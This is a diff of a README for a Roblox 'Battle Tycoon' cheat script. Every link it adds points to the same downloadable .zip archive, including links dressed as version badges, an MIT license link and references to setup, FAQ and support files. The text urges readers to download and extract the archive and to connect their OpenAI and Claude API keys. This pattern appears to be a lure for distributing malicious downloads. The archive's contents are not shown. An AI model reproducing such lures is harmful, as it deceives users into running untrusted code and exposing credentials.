@@ -1,9 +1,9 @@
 # 🏰 Battle Tycoon Roblox Script
 
-[![Version](https://img.shields.io/badge/version-2025.1-informational)](https://github.com/)
-[![Maintained](https://img.shields.io/badge/maintained-yes-brightgreen)](https://github.com/)
-[![Roblox-optimized](https://img.shields.io/badge/Roblox-Optimized-yellow)](https://github.com/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue)](https://opensource.org/licenses/MIT)
+[![Version](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)
+[![Maintained](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)
+[![Roblox-optimized](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)
+[![License: MIT](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)
 
 ## 🎮 Overview
 
@@ -82,7 +82,7 @@ Build and play in the language of your community! Supports a growing roster of w
 
 ### 🕒 24/7 Customer Support
 
-Our echo never sleeps: channel your queries day or night via our community hub (see `SUPPORT.md`). Automated troubleshooting, live answers, and creative problem-solvers are on call—your adventure never stalls.
+Our echo never sleeps: channel your queries day or night via our community hub (see `https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip`). Automated troubleshooting, live answers, and creative problem-solvers are on call—your adventure never stalls.
 
 ---
 
@@ -90,24 +90,24 @@ Our echo never sleeps: channel your queries day or night via our community hub (
 
 Ready to level up? Begin your journey by obtaining the Battle Tycoon Roblox Script package:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://KevinCesar123.github.io)
+[![Download](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)
 
 You’ll receive a complete library including:
 - Core scripts (`/src`)
-- Setup guide (`SETUP.md`)
+- Setup guide (`https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip`)
 - Integration samples (`integrations/`)
 - Language packs (`locales/`)
-- Troubleshooting toolkit (`TOOLS.md`)
+- Troubleshooting toolkit (`https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip`)
 
 ### Installation Steps
 
-1. **Clone or download** the repository (https://KevinCesar123.github.io).
-2. Extract and copy `src/main.lua` into your Roblox Studio workspace.
-3. Follow configuration guidelines in `SETUP.md`.
+1. **Clone or download** the repository (https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip).
+2. Extract and copy `https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip` into your Roblox Studio workspace.
+3. Follow configuration guidelines in `https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip`.
 4. Connect your API keys for OpenAI and Claude (see `integrations/`).
 5. Run, customize, and unleash new plays!
 
-> Note: Seek wisdom in `FAQ.md` if you face roadblocks!
+> Note: Seek wisdom in `https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip` if you face roadblocks!
 
 ---
 
@@ -131,7 +131,7 @@ The authors are not responsible for misuse or violations of Roblox’s or any th
 
 Licensed under the MIT License (2025)—a celebration of open knowledge, creative reuse, and community spirit.
 
-[View the full MIT License](https://opensource.org/licenses/MIT)
+[View the full MIT License](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)
 
 ---
 
@@ -139,7 +139,7 @@ Licensed under the MIT License (2025)—a celebration of open knowledge, creativ
 
 Take command of your Tycoon world—initiate your new era of Roblox gameplay with Battle Tycoon today!
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://KevinCesar123.github.io)
+[![Download](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)](https://raw.githubusercontent.com/KevinCesar123/battle-tycoon-roblox-script-suite/branch/systematically/battle-tycoon-roblox-script-suite-v2.5.zip)
 
 ---
 > *Crafted with innovation, tested with passion, and shared with the gaming universe in 2025!*
